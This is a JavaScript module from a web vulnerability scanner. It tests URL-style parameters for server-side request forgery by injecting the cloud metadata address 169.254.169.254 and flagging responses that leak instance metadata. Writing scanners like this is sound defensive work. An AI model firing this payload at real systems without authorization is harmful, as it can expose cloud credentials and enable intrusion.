// Dark Matter rule-based scanner — SSRF probe (v1).
// Hunts URL-fetching parameters and tests cloud-metadata exfiltration;
// the oracle is a metadata marker echoed in the response (oobHit).
// A full OOB collaborator listener is a documented next step.
import { mutateUrl, probePointName, probePointParameter } from '../probePoints.js';
const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const URL_PARAM_RE = /^(url|uri|image|img|src|source|fetch|feed|redirect|next|callback|webhook)$/i;

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA, ...(opts.headers || {}) } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}


export async function probeSsrf(url, params, opts = {}) {
  const findings = [];
  const candidates = params.filter((p) => URL_PARAM_RE.test(probePointName(p)));
  for (const param of candidates.slice(0, 5)) {
    let body;
    try {
      body = await get(
        mutateUrl(url, param, 'http://169.254.169.254/latest/meta-data/'),
        opts
      );
    } catch {
      continue;
    }
    if (/ami-id|instance-id|meta-data/.test(body)) {
      const m = body.match(/ami-id|instance-id|meta-data/);
      const idx = body.indexOf(m[0]);
      const window = body.slice(Math.max(0, idx - 60), idx + 120);
      findings.push({
        class: 'ssrf',
        id: `ssrf-metadata-${probePointName(param)}`,
        title: `SSRF in parameter '${probePointParameter(param)}' — cloud metadata reachable`,
        severity: 'critical',
        url,
        param: probePointParameter(param),
        evidence: {
          request: `GET ${mutateUrl(url, param, 'http://169.254.169.254/latest/meta-data/')}`,
          response: `cloud metadata marker in the response — "...${window}..."`,
          impact_demo: 'the server-side fetcher reached 169.254.169.254',
          oobHit: true,
        },
      });
    }
  }
  return findings;
}
